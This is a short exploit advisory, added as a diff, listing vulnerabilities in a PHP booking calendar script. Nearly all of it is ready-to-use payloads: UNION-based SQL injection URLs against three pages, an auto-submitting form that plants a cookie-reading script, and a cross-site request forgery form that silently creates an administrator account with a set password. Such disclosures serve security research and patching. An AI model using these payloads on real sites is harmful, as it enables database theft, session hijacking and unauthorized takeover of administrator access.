@@ -1,0 +1,50 @@
+Booking Calendar PHP   - Multiple Vulnerabilties
+===================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST
+.:. Contact        : [F.Hack@w.cn] , [AtT4CKxT3rR0r1ST@gmail.com]
+.:. Home           : http://www.iphobos.com/blog/
+.:. Script         : http://www.sajt-trgovina.com/booking_calendar/
+####################################################################
+
+[1] Multiple Sql Injection
+===========================
+
+http://site/calendare/get_code.php?id=null'+and+1=2+union+select+1,2,version(),4,5,6---
+http://site/calendare/read_answer.php?id=null+and+1=2+union+select+1,2,3,4,5,6,version(),8,9,10
+http://site/calendare/edit_calendar.php?id=null'+and+1=2+union+select+1,version(),3,4,5,6---
+
+[2] Cross Site Scripting
+=========================
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="http://site/calendare/">
+<input type="hidden" name="id_template" value="2"/>
+<input type="hidden" name="name"
+value="<script>alert(document.cookie);</script>"/>
+<input type="hidden" name="save_new_calendar" value="Save new calendar"/>
+</form>
+</body>
+</html>
+
+[3] Cross Site Request Forgery
+==============================
+
+[Add Admin]
+
+<html>
+<body onload="document.form0.submit();">
+<form method="POST" name="form0" action="http://site/calendare/user_add.php
+">
+<input type="hidden" name="name" value="iphobos"/>
+<input type="hidden" name="email" value="email@hotmail.com"/>
+<input type="hidden" name="password" value="123456"/>
+<input type="hidden" name="user_add" value="Save changes"/>
+</form>
+</body>
+</html>
+
+
+####################################################################
